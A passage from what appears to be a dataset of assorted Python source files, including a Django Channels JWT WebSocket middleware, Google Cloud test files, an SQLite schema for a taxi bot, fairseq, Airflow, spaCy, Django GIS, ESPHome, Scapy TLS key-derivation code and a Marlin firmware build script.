        payload = jwt.decode(token, settings.SECRET_KEY, algorithms=ALGORITHM)
        print('payload', payload)
    except:
        print('no payload')
        return AnonymousUser()

    token_exp = datetime.fromtimestamp(payload['exp'])
    if token_exp < datetime.utcnow():
        print(""no date-time"")
        return AnonymousUser()

    try:
        user = User.objects.get(id=payload['user_id'])
        print('user', user)
    except User.DoesNotExist:
        print('no user')
        return AnonymousUser()

    return user


class TokenAuthMiddleware(BaseMiddleware):

    async def __call__(self, scope, receive, send):
        close_old_connections()
        # token_key = scope['query_string'].decode().split('=')[-1]
        try:
            token_key = (dict((x.split('=') for x in scope['query_string'].decode().split(""&"")))).get('token', None)
        except ValueError:
            token_key = None
        # try:
        #     token_key = dict(scope['headers'])[b'sec-websocket-protocol'].decode('utf-8')
        #     print('d1', token_key)
        # except ValueError:
        #     token_key = None

        scope['user'] = await get_user(token_key)
        print('d2', scope['user'])
        return await super().__call__(scope, receive, send)


def JwtAuthMiddlewareStack(inner):
    return TokenAuthMiddleware(inner)
    # return TokenAuthMiddleware(AuthMiddlewareStack(inner))"
JD443	JD443-main_test.py	"# Copyright 2018 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import concurrent.futures
from unittest import mock

from google.cloud import bigquery
import pytest


@pytest.fixture
def flask_client():
    import main

    main.app.testing = True
    return main.app.test_client()


def test_main(flask_client):
    r = flask_client.get(""/"")
    assert r.status_code == 302
    assert ""/results"" in r.headers.get(""location"", """")


def test_results(flask_client, monkeypatch):
    import main

    fake_job = mock.create_autospec(bigquery.QueryJob)
    fake_rows = [(""example1.com"", ""42""), (""example2.com"", ""38"")]
    fake_job.result.return_value = fake_rows

    def fake_get_job(self, job_id, **kwargs):
        return fake_job

    monkeypatch.setattr(main.bigquery.Client, ""get_job"", fake_get_job)

    r = flask_client.get(
        ""/results?project_id=123&job_id=456&location=my_location""
    )
    response_body = r.data.decode(""utf-8"")

    assert r.status_code == 200
    assert ""Query Result"" in response_body  # verifies header
    assert ""example2.com"" in response_body
    assert ""42"" in response_body


def test_results_timeout(flask_client, monkeypatch):
    import main

    fake_job = mock.create_autospec(bigquery.QueryJob)
    fake_job.result.side_effect = concurrent.futures.TimeoutError()

    def fake_get_job(self, job_id, **kwargs):
        return fake_job

    monkeypatch.setattr(main.bigquery.Client, ""get_job"", fake_get_job)

    r = flask_client.get(""/results"", follow_redirects=True)

    assert r.status_code == 200
    assert ""Query Timeout"" in r.data.decode(""utf-8"")"
JD162	JD162-tables.py	"import sqlite3

conn = sqlite3.connect('cheap_taxi_db.db')

conn.execute('''CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY,
    chat_id INTEGER NOT NULL UNIQUE,
    phone INTEGER,
    first_name TEXT,
    last_name TEXT,
    user_name TEXT,
    city TEXT,
    created TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')


conn.execute('''CREATE TABLE IF NOT EXISTS user_settings (
    id INTEGER PRIMARY KEY,
    chat_id INTEGER REFERENCES users(chat_id) ON DELETE CASCADE,
    setting_name TEXT,
    value INTEGER,
    created TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')


conn.execute('''CREATE TABLE IF NOT EXISTS user_addresses (
    id INTEGER PRIMARY KEY,
    chat_id INTEGER REFERENCES users(chat_id) ON DELETE CASCADE,
    country varchar(100),
    area VARCHAR(100),
    city VARCHAR(100),
    street VARCHAR(100),
    house VARCHAR(50),
    full_address VARCHAR(200),
    short_address VARCHAR(100),
    lat FLOAT(12, 8),
    lon FLOAT(12, 8),
    created TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);''')

conn.execute('''CREATE TABLE IF NOT EXISTS csrf_tokens (
    id INTEGER PRIMARY KEY,
    token VARCHAR(250),
    created TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);''')


conn.execute('''CREATE TABLE IF NOT EXISTS session_fast_mode (
    id INTEGER PRIMARY KEY,
    chat_id INTEGER REFERENCES users(chat_id) ON DELETE CASCADE,
    address_1 varchar(100),
    address_2 varchar(100),
    address_3 varchar(100),
    address_4 varchar(100),
    result varchar(50),
    offer_used VARCHAR(250) REFERENCES offers_taxi(offer) ON DELETE CASCADE,
    created TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    closed TIMESTAMP
);''')


conn.execute('''CREATE TABLE IF NOT EXISTS offers_taxi (
    id INTEGER PRIMARY KEY,
    chat_id INTEGER REFERENCES users(chat_id) ON DELETE CASCADE,
    session_id INTEGER REFERENCES session_fast_mode(id) ON DELETE CASCADE,
    offer VARCHAR(250),
    price INTEGER,
    created TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);''')


conn.commit()
conn.close()



"
JD7	JD7-test_lm_context_window.py	"# Copyright (c) Facebook, Inc. and its affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

import unittest

import torch
from fairseq.data import MonolingualDataset
from fairseq.tasks.language_modeling import LanguageModelingTask, LanguageModelingConfig
from tests import utils as test_utils


class TestLMContextWindow(unittest.TestCase):

    def test_eval_dataloader(self):
        dictionary = test_utils.dummy_dictionary(10)
        assert len(dictionary) == 14  # 4 extra special symbols
        assert dictionary.pad() == 1

        dataset = test_utils.TestDataset([
            torch.tensor([4, 5, 6, 7], dtype=torch.long),
            torch.tensor([8, 9, 10, 11], dtype=torch.long),
            torch.tensor([12, 13], dtype=torch.long),
        ])
        dataset = MonolingualDataset(dataset, sizes=[4, 4, 2], src_vocab=dictionary)

        config = LanguageModelingConfig(tokens_per_sample=4)
        task = LanguageModelingTask(config, dictionary)

        eval_dataloader = task.eval_lm_dataloader(
            dataset=dataset,
            batch_size=1,
            context_window=2,
        )

        batch = next(eval_dataloader)
        assert batch[""net_input""][""src_tokens""][0].tolist() == [4, 5, 6, 7, 1, 1]
        assert batch[""target""][0].tolist() == [4, 5, 6, 7, 1, 1]

        batch = next(eval_dataloader)
        assert batch[""net_input""][""src_tokens""][0].tolist() == [6, 7, 8, 9, 10, 11]
        assert batch[""target""][0].tolist() == [1, 1, 8, 9, 10, 11]

        batch = next(eval_dataloader)
        assert batch[""net_input""][""src_tokens""][0].tolist() == [10, 11, 12, 13]
        assert batch[""target""][0].tolist() == [1, 1, 12, 13]


if __name__ == ""__main__"":
    unittest.main()"
JY293	JY293-0017_1_7_1_add_task_fails_journal_table.py	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
""""""Add ``task_fail`` table

Revision ID: 64de9cddf6c9
Revises: 211e584da130
Create Date: 2016-08-03 14:02:59.203021

""""""
from __future__ import annotations

import sqlalchemy as sa
from alembic import op

from airflow.migrations.db_types import StringID

# revision identifiers, used by Alembic.
revision = ""64de9cddf6c9""
down_revision = ""211e584da130""
branch_labels = None
depends_on = None
airflow_version = ""1.7.1.3""


def upgrade():
    op.create_table(
        ""task_fail"",
        sa.Column(""id"", sa.Integer(), nullable=False),
        sa.Column(""task_id"", StringID(), nullable=False),
        sa.Column(""dag_id"", StringID(), nullable=False),
        sa.Column(""execution_date"", sa.DateTime(), nullable=False),
        sa.Column(""start_date"", sa.DateTime(), nullable=True),
        sa.Column(""end_date"", sa.DateTime(), nullable=True),
        sa.Column(""duration"", sa.Integer(), nullable=True),
        sa.PrimaryKeyConstraint(""id""),
    )


def downgrade():
    op.drop_table(""task_fail"")"
JD490	JD490-lex_attrs.py	"# coding: utf8
from __future__ import unicode_literals

from ...attrs import LIKE_NUM

_num_words = [
    ""zero"",
    ""one"",
    ""two"",
    ""three"",
    ""four"",
    ""five"",
    ""six"",
    ""seven"",
    ""eight"",
    ""nine"",
    ""ten"",
    ""eleven"",
    ""twelve"",
    ""thirteen"",
    ""fourteen"",
    ""fifteen"",
    ""sixteen"",
    ""seventeen"",
    ""eighteen"",
    ""nineteen"",
    ""twenty"",
    ""thirty"",
    ""forty"",
    ""fifty"",
    ""sixty"",
    ""seventy"",
    ""eighty"",
    ""ninety"",
    ""hundred"",
    ""thousand"",
    ""million"",
    ""billion"",
    ""trillion"",
    ""quadrillion"",
    ""gajillion"",
    ""bazillion"",
]


_ordinal_words = [
    ""first"",
    ""second"",
    ""third"",
    ""fourth"",
    ""fifth"",
    ""sixth"",
    ""seventh"",
    ""eighth"",
    ""ninth"",
    ""tenth"",
    ""eleventh"",
    ""twelfth"",
    ""thirteenth"",
    ""fourteenth"",
    ""fifteenth"",
    ""sixteenth"",
    ""seventeenth"",
    ""eighteenth"",
    ""nineteenth"",
    ""twentieth"",
    ""thirtieth"",
    ""fortieth"",
    ""fiftieth"",
    ""sixtieth"",
    ""seventieth"",
    ""eightieth"",
    ""ninetieth"",
    ""hundredth"",
    ""thousandth"",
    ""millionth"",
    ""billionth"",
    ""trillionth"",
    ""quadrillionth"",
    ""gajillionth"",
    ""bazillionth"",
]

def like_num(text):
    if text.startswith((""+"", ""-"", ""±"", ""~"")):
        text = text[1:]
    text = text.replace("","", """").replace(""."", """")
    if text.isdigit():
        return True
    if text.count(""/"") == 1:
        num, denom = text.split(""/"")
        if num.isdigit() and denom.isdigit():
            return True

    text_lower = text.lower()
    if text_lower in _num_words:
        return True

    # CHeck ordinal number
    if text_lower in _ordinal_words:
        return True
    if text_lower.endswith(""th""):
        if text_lower[:-2].isdigit():
            return True 

    return False


LEX_ATTRS = {LIKE_NUM: like_num}"
JY222	JY222-const.py	"""""""
PostGIS to GDAL conversion constant definitions
""""""
# Lookup to convert pixel type values from GDAL to PostGIS
GDAL_TO_POSTGIS = [None, 4, 6, 5, 8, 7, 10, 11, None, None, None, None]

# Lookup to convert pixel type values from PostGIS to GDAL
POSTGIS_TO_GDAL = [1, 1, 1, 3, 1, 3, 2, 5, 4, None, 6, 7, None, None]

# Struct pack structure for raster header, the raster header has the
# following structure:
#
# Endianness, PostGIS raster version, number of bands, scale, origin,
# skew, srid, width, and height.
#
# Scale, origin, and skew have x and y values. PostGIS currently uses
# a fixed endianness (1) and there is only one version (0).
POSTGIS_HEADER_STRUCTURE = ""B H H d d d d d d i H H""

# Lookup values to convert GDAL pixel types to struct characters. This is
# used to pack and unpack the pixel values of PostGIS raster bands.
GDAL_TO_STRUCT = [
    None,
    ""B"",
    ""H"",
    ""h"",
    ""L"",
    ""l"",
    ""f"",
    ""d"",
    None,
    None,
    None,
    None,
]

# Size of the packed value in bytes for different numerical types.
# This is needed to cut chunks of band data out of PostGIS raster strings
# when decomposing them into GDALRasters.
# See https://docs.python.org/library/struct.html#format-characters
STRUCT_SIZE = {
    ""b"": 1,  # Signed char
    ""B"": 1,  # Unsigned char
    ""?"": 1,  # _Bool
    ""h"": 2,  # Short
    ""H"": 2,  # Unsigned short
    ""i"": 4,  # Integer
    ""I"": 4,  # Unsigned Integer
    ""l"": 4,  # Long
    ""L"": 4,  # Unsigned Long
    ""f"": 4,  # Float
    ""d"": 8,  # Double
}

# Pixel type specifies type of pixel values in a band. Storage flag specifies
# whether the band data is stored as part of the datum or is to be found on the
# server's filesystem. There are currently 11 supported pixel value types, so 4
# bits are enough to account for all. Reserve the upper 4 bits for generic
# flags. See
# https://trac.osgeo.org/postgis/wiki/WKTRaster/RFC/RFC1_V0SerialFormat#Pixeltypeandstorageflag
BANDTYPE_PIXTYPE_MASK = 0x0F
BANDTYPE_FLAG_HASNODATA = 1 << 6"
JD390	JD390-adapter.py	"from cx_Oracle import CLOB

from django.contrib.gis.db.backends.base.adapter import WKTAdapter
from django.contrib.gis.geos import GeometryCollection, Polygon


class OracleSpatialAdapter(WKTAdapter):
    input_size = CLOB

    def __init__(self, geom):
        """"""
        Oracle requires that polygon rings are in proper orientation. This
        affects spatial operations and an invalid orientation may cause
        failures. Correct orientations are:
         * Outer ring - counter clockwise
         * Inner ring(s) - clockwise
        """"""
        if isinstance(geom, Polygon):
            if self._polygon_must_be_fixed(geom):
                geom = self._fix_polygon(geom)
        elif isinstance(geom, GeometryCollection):
            if any(
                isinstance(g, Polygon) and self._polygon_must_be_fixed(g) for g in geom
            ):
                geom = self._fix_geometry_collection(geom)

        self.wkt = geom.wkt
        self.srid = geom.srid

    @staticmethod
    def _polygon_must_be_fixed(poly):
        return not poly.empty and (
            not poly.exterior_ring.is_counterclockwise
            or any(x.is_counterclockwise for x in poly)
        )

    @classmethod
    def _fix_polygon(cls, poly, clone=True):
        """"""Fix single polygon orientation as described in __init__().""""""
        if clone:
            poly = poly.clone()

        if not poly.exterior_ring.is_counterclockwise:
            poly.exterior_ring = list(reversed(poly.exterior_ring))

        for i in range(1, len(poly)):
            if poly[i].is_counterclockwise:
                poly[i] = list(reversed(poly[i]))

        return poly

    @classmethod
    def _fix_geometry_collection(cls, coll):
        """"""
        Fix polygon orientations in geometry collections as described in
        __init__().
        """"""
        coll = coll.clone()
        for i, geom in enumerate(coll):
            if isinstance(geom, Polygon):
                coll[i] = cls._fix_polygon(geom, clone=False)
        return coll"
JY350	JY350-forms.py	"from django import forms
from django.contrib.auth.forms import UserCreationForm,AuthenticationForm, UsernameField
from django.contrib.auth.models import User
from django.utils.translation import gettext, gettext_lazy as _
from .models import Post,Order

class SignUpForm(UserCreationForm):
    password1 = forms.CharField(label='Password', widget=forms.PasswordInput(attrs={'class':'form-control'}))
    password2 = forms.CharField(label='Confirm Password(again)', widget=forms.PasswordInput(attrs={'class':'form-control'}))

    class Meta:
        model = User
        fields = ['username', 'first_name', 'last_name','email']
        labels = {'first_name' : 'First Name', 'last_name':'Last Name', 'email' : 'Email'}
        widgets = {
            'username':forms.TextInput(attrs={'class':'form-control'}),
            'first_name':forms.TextInput(attrs={'class':'form-control'}),
            'last_name':forms.TextInput(attrs={'class':'form-control'}),
            'email':forms.TextInput(attrs={'class':'form-control'}),
            }
        
class LoginForm(AuthenticationForm):
    username = UsernameField(widget=forms.TextInput(attrs={'autofocus':True,'class':'form-control'}))
    password = forms.CharField(label=_(""Password""),strip=False,widget=forms.PasswordInput(attrs={'autocomplete':'current-password','class':'form-control'}))
class PostForm(forms.ModelForm):
    class Meta:
        model = Order
        fields = ['title','cost']
        labels = {'title' : 'Title', 'cost' : 'Cost',}
        widgets = {'title' : forms.TextInput(attrs={'class' : 'form-control'}),'cost':forms.Textarea(attrs={'class':'form-control'}),}
class PostForm(forms.ModelForm):
    class Meta:
        model = Post
        fields = ['title','desc','image']
        labels = {'title' : 'Title', 'desc' : 'Description',}
        widgets = {'title' : forms.TextInput(attrs={'class' : 'form-control'}),'desc':forms.Textarea(attrs={'class':'form-control'}),}"
JD2	JD2-module_proxy_wrapper.py	"# Copyright (c) Facebook, Inc. and its affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

from torch import nn


class ModuleProxyWrapper(nn.Module):
    """"""
    Wrap a DistributedDataParallel module and forward requests for missing
    attributes to the module wrapped by DDP (the twice-wrapped module).
    Also forward calls to :func:`state_dict` and :func:`load_state_dict`.

    Usage::

        module.xyz = ""hello world""
        wrapped_module = DistributedDataParallel(module, **ddp_args)
        wrapped_module = ModuleProxyWrapper(wrapped_module)
        assert wrapped_module.xyz == ""hello world""
        assert wrapped_module.state_dict().keys() == module.state_dict().keys()

    Args:
        module (nn.Module): module to wrap
    """"""

    def __init__(self, module: nn.Module):
        super().__init__()
        assert hasattr(module, ""module""), \
            ""ModuleProxyWrapper expects input to wrap another module""
        self.module = module

    def __getattr__(self, name):
        """"""Forward missing attributes to twice-wrapped module.""""""
        try:
            # defer to nn.Module's logic
            return super().__getattr__(name)
        except AttributeError:
            try:
                # forward to the once-wrapped module
                return getattr(self.module, name)
            except AttributeError:
                # forward to the twice-wrapped module
                return getattr(self.module.module, name)

    def state_dict(self, *args, **kwargs):
        """"""Forward to the twice-wrapped module.""""""
        return self.module.module.state_dict(*args, **kwargs)

    def load_state_dict(self, *args, **kwargs):
        """"""Forward to the twice-wrapped module.""""""
        return self.module.module.load_state_dict(*args, **kwargs)

    def forward(self, *args, **kwargs):
        return self.module(*args, **kwargs)"
JY108	JY108-genshi.py	"from __future__ import absolute_import, division, unicode_literals

from genshi.core import QName, Attrs
from genshi.core import START, END, TEXT, COMMENT, DOCTYPE


def to_genshi(walker):
    """"""Convert a tree to a genshi tree

    :arg walker: the treewalker to use to walk the tree to convert it

    :returns: generator of genshi nodes

    """"""
    text = []
    for token in walker:
        type = token[""type""]
        if type in (""Characters"", ""SpaceCharacters""):
            text.append(token[""data""])
        elif text:
            yield TEXT, """".join(text), (None, -1, -1)
            text = []

        if type in (""StartTag"", ""EmptyTag""):
            if token[""namespace""]:
                name = ""{%s}%s"" % (token[""namespace""], token[""name""])
            else:
                name = token[""name""]
            attrs = Attrs(
                [
                    (QName(""{%s}%s"" % attr if attr[0] is not None else attr[1]), value)
                    for attr, value in token[""data""].items()
                ]
            )
            yield (START, (QName(name), attrs), (None, -1, -1))
            if type == ""EmptyTag"":
                type = ""EndTag""

        if type == ""EndTag"":
            if token[""namespace""]:
                name = ""{%s}%s"" % (token[""namespace""], token[""name""])
            else:
                name = token[""name""]

            yield END, QName(name), (None, -1, -1)

        elif type == ""Comment"":
            yield COMMENT, token[""data""], (None, -1, -1)

        elif type == ""Doctype"":
            yield DOCTYPE, (token[""name""], token[""publicId""], token[""systemId""]), (
                None,
                -1,
                -1,
            )

        else:
            pass  # FIXME: What to do?

    if text:
        yield TEXT, """".join(text), (None, -1, -1)"
JY499	JY499-sensor.py	"import esphome.codegen as cg
import esphome.config_validation as cv
from esphome.components import sensor, esp32_ble_tracker
from esphome.const import (
    CONF_MAC_ADDRESS,
    STATE_CLASS_MEASUREMENT,
    UNIT_PERCENT,
    ICON_WATER_PERCENT,
    CONF_ID,
    CONF_MOISTURE,
    CONF_CONDUCTIVITY,
    UNIT_MICROSIEMENS_PER_CENTIMETER,
    ICON_FLOWER,
)

DEPENDENCIES = [""esp32_ble_tracker""]
AUTO_LOAD = [""xiaomi_ble""]

xiaomi_hhccpot002_ns = cg.esphome_ns.namespace(""xiaomi_hhccpot002"")
XiaomiHHCCPOT002 = xiaomi_hhccpot002_ns.class_(
    ""XiaomiHHCCPOT002"", esp32_ble_tracker.ESPBTDeviceListener, cg.Component
)

CONFIG_SCHEMA = (
    cv.Schema(
        {
            cv.GenerateID(): cv.declare_id(XiaomiHHCCPOT002),
            cv.Required(CONF_MAC_ADDRESS): cv.mac_address,
            cv.Optional(CONF_MOISTURE): sensor.sensor_schema(
                unit_of_measurement=UNIT_PERCENT,
                icon=ICON_WATER_PERCENT,
                accuracy_decimals=0,
                state_class=STATE_CLASS_MEASUREMENT,
            ),
            cv.Optional(CONF_CONDUCTIVITY): sensor.sensor_schema(
                unit_of_measurement=UNIT_MICROSIEMENS_PER_CENTIMETER,
                icon=ICON_FLOWER,
                accuracy_decimals=0,
                state_class=STATE_CLASS_MEASUREMENT,
            ),
        }
    )
    .extend(esp32_ble_tracker.ESP_BLE_DEVICE_SCHEMA)
    .extend(cv.COMPONENT_SCHEMA)
)


async def to_code(config):
    var = cg.new_Pvariable(config[CONF_ID])
    await cg.register_component(var, config)
    await esp32_ble_tracker.register_ble_device(var, config)

    cg.add(var.set_address(config[CONF_MAC_ADDRESS].as_hex))

    if CONF_MOISTURE in config:
        sens = await sensor.new_sensor(config[CONF_MOISTURE])
        cg.add(var.set_moisture(sens))
    if CONF_CONDUCTIVITY in config:
        sens = await sensor.new_sensor(config[CONF_CONDUCTIVITY])
        cg.add(var.set_conductivity(sens))"
JY115	JY115-hkdf.py	"# This file is part of Scapy
# Copyright (C) 2017 Maxence Tury
# This program is published under a GPLv2 license

""""""
Stateless HKDF for TLS 1.3.
""""""

import struct

from scapy.config import conf
from scapy.layers.tls.crypto.pkcs1 import _get_hash

if conf.crypto_valid:
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF, HKDFExpand
    from cryptography.hazmat.primitives.hashes import Hash
    from cryptography.hazmat.primitives.hmac import HMAC


class TLS13_HKDF(object):
    def __init__(self, hash_name=""sha256""):
        self.hash = _get_hash(hash_name)

    def extract(self, salt, ikm):
        h = self.hash
        hkdf = HKDF(h, h.digest_size, salt, None, default_backend())
        if ikm is None:
            ikm = b""\x00"" * h.digest_size
        return hkdf._extract(ikm)

    def expand(self, prk, info, L):
        h = self.hash
        hkdf = HKDFExpand(h, L, info, default_backend())
        return hkdf.derive(prk)

    def expand_label(self, secret, label, hash_value, length):
        hkdf_label = struct.pack(""!H"", length)
        hkdf_label += struct.pack(""B"", 6 + len(label))
        hkdf_label += b""tls13 ""
        hkdf_label += label
        hkdf_label += struct.pack(""B"", len(hash_value))
        hkdf_label += hash_value
        return self.expand(secret, hkdf_label, length)

    def derive_secret(self, secret, label, messages):
        h = Hash(self.hash, backend=default_backend())
        h.update(messages)
        hash_messages = h.finalize()
        hash_len = self.hash.digest_size
        return self.expand_label(secret, label, hash_messages, hash_len)

    def compute_verify_data(self, basekey, handshake_context):
        hash_len = self.hash.digest_size
        finished_key = self.expand_label(basekey, b""finished"", b"""", hash_len)

        h = Hash(self.hash, backend=default_backend())
        h.update(handshake_context)
        hash_value = h.finalize()

        hm = HMAC(finished_key, self.hash, default_backend())
        hm.update(hash_value)
        return hm.finalize()"
JD369	JD369-cloudiot_pubsub_example_server_test.py	"# Copyright 2017 Google Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import time
import uuid

import cloudiot_pubsub_example_server as example_server

cloud_region = 'us-central1'
device_id_template = 'test-device-{}'
topic_id = 'test-device-events-topic-{}'.format(int(time.time()))

project_id = os.environ['GOOGLE_CLOUD_PROJECT']
service_account_json = os.environ['GOOGLE_APPLICATION_CREDENTIALS']

pubsub_topic = 'projects/{}/topics/{}'.format(project_id, topic_id)
registry_id = 'test-registry-{}-{}'.format(uuid.uuid4().hex, int(time.time()))


def test_config_turn_on(capsys):
    max_temp = 11
    data = {u'temperature': max_temp}

    Server = example_server.Server(service_account_json)
    Server._update_device_config(
        project_id,
        cloud_region,
        registry_id,
        device_id_template,
        data)

    stdout, _ = capsys.readouterr()
    assert 'on' in stdout
    assert '11' in stdout
    assert 'test-device-{}' in stdout


def test_config_turn_off(capsys):
    min_temp = -1
    data = {u'temperature': min_temp}

    Server = example_server.Server(service_account_json)
    Server._update_device_config(
        project_id,
        cloud_region,
        registry_id,
        device_id_template,
        data)

    stdout, _ = capsys.readouterr()
    assert 'off' in stdout
    assert '-1' in stdout
    assert 'test-device-{}' in stdout"
JY99	JY99-admin.py	"from django.contrib import admin
from django.contrib.admin.utils import quote
from django.contrib.admin.views.main import ChangeList
from django.contrib.auth import get_user_model
from django.core.exceptions import ValidationError
from django.urls import reverse

from rest_framework.authtoken.models import Token, TokenProxy

User = get_user_model()


class TokenChangeList(ChangeList):
    """"""Map to matching User id""""""

    def url_for_result(self, result):
        pk = result.user.pk
        return reverse(
            ""admin:%s_%s_change"" % (self.opts.app_label, self.opts.model_name),
            args=(quote(pk),),
            current_app=self.model_admin.admin_site.name,
        )


class TokenAdmin(admin.ModelAdmin):
    list_display = (""key"", ""user"", ""created"")
    fields = (""user"",)
    ordering = (""-created"",)
    actions = None  # Actions not compatible with mapped IDs.

    def get_changelist(self, request, **kwargs):
        return TokenChangeList

    def get_object(self, request, object_id, from_field=None):
        """"""
        Map from User ID to matching Token.
        """"""
        queryset = self.get_queryset(request)
        field = User._meta.pk
        try:
            object_id = field.to_python(object_id)
            user = User.objects.get(**{field.name: object_id})
            return queryset.get(user=user)
        except (
            queryset.model.DoesNotExist,
            User.DoesNotExist,
            ValidationError,
            ValueError,
        ):
            return None

    def delete_model(self, request, obj):
        # Map back to actual Token, since delete() uses pk.
        token = Token.objects.get(key=obj.key)
        return super().delete_model(request, token)


admin.site.register(TokenProxy, TokenAdmin)"
JY276	JY276-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""scatterpolar"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JD295	JD295-generic_create_variant.py	"#
# generic_create_variant.py
#
# Copy one of the variants from buildroot/platformio/variants into
# the appropriate framework variants folder, so that its contents
# will be picked up by PlatformIO just like any other variant.
#
import pioutil
if pioutil.is_pio_build():
    import shutil,marlin
    from pathlib import Path

    #
    # Get the platform name from the 'platform_packages' option,
    # or look it up by the platform.class.name.
    #
    env = marlin.env
    platform = env.PioPlatform()

    from platformio.package.meta import PackageSpec
    platform_packages = env.GetProjectOption('platform_packages')

    # Remove all tool items from platform_packages
    platform_packages = [x for x in platform_packages if not x.startswith(""platformio/tool-"")]

    if len(platform_packages) == 0:
        framewords = {
            ""Ststm32Platform"": ""framework-arduinoststm32"",
            ""AtmelavrPlatform"": ""framework-arduino-avr""
        }
        platform_name = framewords[platform.__class__.__name__]
    else:
        platform_name = PackageSpec(platform_packages[0]).name

    if platform_name in [ ""usb-host-msc"", ""usb-host-msc-cdc-msc"", ""usb-host-msc-cdc-msc-2"", ""usb-host-msc-cdc-msc-3"", ""tool-stm32duino"", ""biqu-bx-workaround"", ""main"" ]:
        platform_name = ""framework-arduinoststm32""

    FRAMEWORK_DIR = Path(platform.get_package_dir(platform_name))
    assert FRAMEWORK_DIR.is_dir()

    board = env.BoardConfig()

    #mcu_type = board.get(""build.mcu"")[:-2]
    variant = board.get(""build.variant"")
    #series = mcu_type[:7].upper() + ""xx""

    # Prepare a new empty folder at the destination
    variant_dir = FRAMEWORK_DIR / ""variants"" / variant
    if variant_dir.is_dir():
        shutil.rmtree(variant_dir)
    if not variant_dir.is_dir():
        variant_dir.mkdir()

    # Source dir is a local variant sub-folder
    source_dir = Path(""buildroot/share/PlatformIO/variants"", variant)
    assert source_dir.is_dir()

    marlin.copytree(source_dir, variant_dir)"
JY106	JY106-compat.py	"# -*- coding: utf-8 -*-
from io import BytesIO

import csv
import codecs
import importlib

from django.conf import settings


#
# Django compatibility
#
def load_tag_library(libname):
    """"""
    Load a templatetag library on multiple Django versions.

    Returns None if the library isn't loaded.
    """"""
    from django.template.backends.django import get_installed_libraries
    from django.template.library import InvalidTemplateLibrary
    try:
        lib = get_installed_libraries()[libname]
        lib = importlib.import_module(lib).register
        return lib
    except (InvalidTemplateLibrary, KeyError):
        return None


def get_template_setting(template_key, default=None):
    """""" Read template settings """"""
    templates_var = getattr(settings, 'TEMPLATES', None)
    if templates_var:
        for tdict in templates_var:
            if template_key in tdict:
                return tdict[template_key]
    return default


class UnicodeWriter:
    """"""
    CSV writer which will write rows to CSV file ""f"",
    which is encoded in the given encoding.
    We are using this custom UnicodeWriter for python versions 2.x
    """"""

    def __init__(self, f, dialect=csv.excel, encoding=""utf-8"", **kwds):
        self.queue = BytesIO()
        self.writer = csv.writer(self.queue, dialect=dialect, **kwds)
        self.stream = f
        self.encoder = codecs.getincrementalencoder(encoding)()

    def writerow(self, row):
        self.writer.writerow([s.encode(""utf-8"") for s in row])
        # Fetch UTF-8 output from the queue ...
        data = self.queue.getvalue()
        data = data.decode(""utf-8"")
        # ... and reencode it into the target encoding
        data = self.encoder.encode(data)
        # write to the target stream
        self.stream.write(data)
        # empty queue
        self.queue.truncate(0)

    def writerows(self, rows):
        for row in rows:
            self.writerow(row)"
JY212	JY212-technical_response.py	"# -*- coding: utf-8 -*-
import threading

from django.core.handlers.wsgi import WSGIHandler

tld = threading.local()
tld.wsgi_tb = None


def null_technical_500_response(request, exc_type, exc_value, tb, status_code=500):
    """"""
    Alternative function for django.views.debug.technical_500_response.

    Django's convert_exception_to_response() wrapper is called on each 'Middleware' object to avoid
